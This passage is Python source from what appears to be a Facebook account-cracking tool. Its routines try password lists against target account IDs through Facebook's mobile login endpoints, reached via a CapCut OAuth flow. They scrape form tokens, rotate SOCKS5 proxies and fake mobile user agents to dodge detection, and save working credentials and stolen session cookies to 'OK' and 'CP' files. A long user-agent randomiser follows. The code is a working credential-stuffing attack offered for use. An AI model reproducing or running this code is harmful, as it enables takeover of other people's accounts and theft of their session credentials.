M2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P} => {M}{idf}|{pw} => {nmf} => {url} => {tahun(idf)}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} => {H}{idf}|{pw} => {nmf} => {url} => {tahun(idf)} => {kuki} => {ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

#<-[ Metod-ProdV2 ]->#
def crack3(idf,pwv,nmf):
	global loop,ok,cp
	sys.stdout.write(f"\r{P} => {N}{'{:.0%}'.format(loop/float(len(id)))} {(loop)}={len(id)} {idf} {H}{(ok)}{N}={M}{(cp)}{N} "),sys.stdout.flush()
	ua, ua2 = Ugen(),Ugen2()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "free.prod.facebook.com","cache-control": "max-age=0","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Chromium";v="107", "Not=A?Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-dest": "document","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://free.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': 'browser_dropdown', 'prefill_type': 'password', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': 'true', 'had_password_prefilled': 'true', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.15625; wd=501x950'
			heade={
			"Host": "free.prod.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://free.prod.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2b70837-684f-4f50-abec-6cef1b16e764%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3De45826933gASoVCgoVPZIDFhM2UzMGQ1OWI5YjVmOTlkNGQ0YjM4NTQzYzc0NjA5oU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFMvWh0dHBzOi8vd3d3LmNhcGN1dC5jb20vc2lnbnVwoVTZIDIxYTZiZDlkMWM0MDE5OTY4MzZiNjk3N2M5MjEyODE4oVcAoUYAolNBAKFVwg%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://free.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P} => {M}{idf}|{pw} => {nmf} => {tahun(idf)}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} => {H}{idf}|{pw} => {nmf} => {tahun(idf)} => {kuki} => {ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

#<-[ Convert-Cookies ]->#
#def Konversi(cookie):
#	cok = ('datr=%s;fr=%s;c_user=%s;xs=%s'%(cookie['datr'],cookie['fr'],cookie['c_user'],cookie['xs']))
#	return(str(cok))

#<-[ User-Agent ]->#
def Ugen():
	a = random.choice(["7","8","9","10","12","13","14","6.0","7.0","8.0","9.0","7.1.1","8.0.0","8.1.0",f"{str(random.randint(5,9))}.0.0",f"{str(random.randint(5,9))}.0.1",f"{str(random.randint(5,9))}.1.1",f"{str(random.randint(5,9))}.1.{str(random.randint(0,1))}",f"{str(random.randint(5,9))}.0",str(random.randint(5,14))])
	b = random.choice(["LRX22C","LRX21V","LRX22G","LMY47I","LMY47V","OPM1","OPR1","O11019","TPR1","TP1A","RP1A","PPR1","PKQ1","QQ1A","QP1A","SKQ1","SP1A","RKQ1","RQ1A","QKQ1","TKQ1"])
	c = random.randrange(130000,230000)
	d = random.randrange(10,32)
	e = random.randrange(80,120)
	f = '0'
	g = random.randrange(4200,6200)
	h = random.randrange(70,200)
	i = random.choice(['MZ-m1 note','MZ-m2 note','MZ-M3s','MZ-M3','MZ-M5s','MZ-M3 Max','MZ-m3 note','MZ-MX4','MZ-U20','MZ-MX4 Pro','MZ-PRO 5','MZ-U10','MZ-M5c','MZ-meizu M8 lite','MZ-mmm52','MZ-Meizu S6','MZ-M3 Max','MZ-M1 E','MZ-meizu note9','MZ-16 X','MZ-16th Plus','MZ-15 Plus','MZ-16T','MZ-M6','MZ-PRO 7 Plus','MZ-m1 metal','MZ-16s Pro','MZ-M5 Note','MZ-Meizu 6T','MZ-16 X','MZ-16th','MZ-MEIZU 18X','MZ-MEIZU 18s','MZ-M1822','MZ-meizu 17','MZ-meizu 17 Pro','MZ-MEIZU 18 Pro','MZ-TYH212U','MZ-MEIZU 20','MZ-MEIZU 20 Pro','Meizu C3','MZ-ZTE T660','ZTE BLADE 8'])
	j = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921'])
	k = random.choice(['CPH1869','CPH1929','CPH2107','CPH2238','CPH2389','CPH2401','CPH2407','CPH2413','CPH2415','CPH2417','CPH2419','CPH2455','CPH2459','CPH2461','CPH2471','CPH2473','CPH2477','CPH8893','CPH2321','CPH2341','CPH2373','CPH2083','CPH2071','CPH2077','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH1923','CPH1925','CPH1837','CPH2015','CPH2073','CPH2081','CPH2029','CPH2031','CPH2137','CPH1605','CPH1803','CPH1853','CPH1805','CPH1809','CPH1851','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH2061','CPH2069','CPH2127','CPH2131','CPH2139','CPH2135','CPH2239','CPH2195','CPH2273','CPH2325','CPH2309','CPH1701','CPH2387','CPH1909','CPH1920','CPH1912','CPH1901','CPH1903','CPH1905','CPH1717','CPH1801','CPH2067','CPH2099','CPH2161','CPH2219','CPH2197','CPH2263','CPH2375','CPH2339','CPH1715','CPH2385','CPH1729','CPH1827','CPH1938','CPH1937','CPH1939','CPH1941','CPH2001','CPH2021','CPH2059','CPH2121','CPH2123','CPH2203','CPH2333','CPH2365','CPH1913','CPH1911','CPH1915','CPH1969','CPH2209','CPH1987','CPH2095','CPH2119','CPH2285','CPH2213','CPH2223','CPH2363','CPH1609','CPH1613','CPH1723','CPH1727','CPH1725','CPH1819','CPH1821','CPH1825','CPH1881','CPH1823','CPH1871','CPH1875','CPH2023','CPH2005','CPH2025','CPH2207','CPH2173','CPH2307','CPH2305','CPH2337','CPH1955','CPH1707','CPH1719','CPH1721','CPH1835','CPH1831','CPH1833','CPH1879','CPH1893','CPH1877','CPH1607','CPH1611','CPH1917','CPH1919','CPH1907','CPH1989','CPH1945','CPH1951','CPH2043','CPH2035','CPH2037','CPH2036','CPH2009','CPH2013','CPH2113','CPH2091','CPH2125','CPH2109','CPH2089','CPH2065','CPH2159','CPH2145','CPH2205','CPH2201','CPH2199','CPH2217','CPH1921','CPH2211','CPH2235','CPH2251','CPH2249','CPH2247','CPH2237','CPH2371','CPH2293','CPH2353','CPH2343','CPH2359','CPH2357','CPH2457','CPH1983','CPH1979','oppo f 5 plus','OPPO F1','OPPO F1 Plus','PEPM00','PEDM00','PCHM10','PCLM10','PCCM00','PDBM00','OPPO PBBM30','OPPO A31','OPPO F1s','A31','OPPO R11s','OPPO A37m'])
	l = random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X676B','Infinix X687','Infinix X609','Infinix X697','Infinix X680D','Infinix X507','Infinix X605','Infinix X668','Infinix X6815B','Infinix X624','Infinix X655F','Infinix X689C','Infinix X608','Infinix X698','Infinix X682C','Infinix X688C','Infinix X689B','Infinix X689','Infinix X689D','Infinix X662','Infinix X662B','Infinix X675','Infinix X6812B','Infinix X6812','Infinix X6817B','Infinix X6817','Infinix X6816C','Infinix X6816','Infinix X6816D','Infinix X668C','Infinix X665B','Infinix X665E','Infinix X510','Infinix X559C','Infinix X559F','Infinix X559','Infinix X606','Infinix X606C','Infinix X606D','Infinix X623','Infinix X624B','Infinix X625C','Infinix X625D','Infinix X625B','Infinix X650D','Infinix X650B','Infinix X650','Infinix X650C','Infinix X655C','Infinix X655D','Infinix X680B','Infinix X573','Infinix X573B','Infinix X622','Infinix X693','Infinix X695C','Infinix X695D','Infinix X695','Infinix X663B','Infinix X663','Infinix X670','Infinix X671','Infinix X671B','Infinix X672','Infinix X6819','Infinix X572','Infinix X572-LTE','Infinix X571','Infinix X604','Infinix X610B','Infinix X690','Infinix X690B','Infinix X656','Infinix X692','Infinix X683','Infinix X450','Infinix X5010','Infinix X501','Infinix X401','Infinix X626','Infinix X626B','Infinix X652','Infinix X652A','Infinix X652B','Infinix X652C','Infinix X660B','Infinix X660C','Infinix X660','Infinix X5515','Infinix X5515F','Infinix X5515I','Infinix X609B','Infinix X5514D','Infinix X5516B','Infinix X5516C','Infinix X627','Infinix X680','Infinix X653','Infinix X653C','Infinix X657','Infinix X657B','Infinix X657C','Infinix X6511B','Infinix X6511E','Infinix X6511','Infinix X6512','Infinix X6823C','Infinix X612B','Infinix X612','Infinix X503','Infinix X511','Infinix X352','Infinix X351','Infinix X530','Infinix X676C','Infinix X6821','Infinix X6823','Infinix X6827','Infinix X509','Infinix X603','Infinix X6815','Infinix X620B','Infinix X620','Infinix X687B','Infinix X6811B','Infinix X6810','Infinix X6811',f"Infinix X{str(random.randint(550,699))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(5511,5516))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(6711,6899))}{random.choice(['B','C','D','E','F',''])}"])
	m = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','GT-I9300','TECNO CD8','itel L6005','itel L6501','TECNO KE7','TECNO IN2','TECNO CD6j','TECNO BD2p','TECNO KD7h','TECNO LA7','itel W6004','MobiGo2','TECNO LC6','TECNO KB7j','itel S661W','TB300FU','S96GT','ZTE A2023G','OPPO A79kt','TECNO CI7n','MP1718','V2154A','SAMSUNG SM-M346B','itel S663L','CHL-AL00','vivo Z3x','CHL-AL00','ivvi P60(i8)'])
	n = random.choice([f'{str(random.randint(10,18))}_{str(random.randint(0,9))}_{str(random.randint(0,9))}',f'{str(random.randint(10,18))}_{str(random.randint(0,9))}'])
	o = random.choice(["en-us","en-gb","id-id","de-de","ru-ru","en-sg","my-sg","fr-fr","fa-ir","ja-jp","pt-br","cs-cz","zh-hk","zh-cn","vi-vn","en-ph","en-in","tr-tr","es-es","it-it","zh-tw"])
	z = random.choice([
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {i} Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h}{random.choice([f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,20))}.110-{str(random.randint(2000000000,2029999999))} UWS/2.15.0.4',f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,10))}.{str(random.randint(0,10))} UWS/2.15.0.2',f' MZBrowser/{str(random.randint(8,10))}.{str(random.randint(0,20))}.{str(random.randint(0,20))}',f' MQQBrowser/{str(random.randint(4,10))}.{str(random.randint(0,9))}',f' UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(100,1299))}'])} Mobile Safari/537.36",
		f"Mozilla/5.0 (Linux; Android {a}; {j} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {k} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {l} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
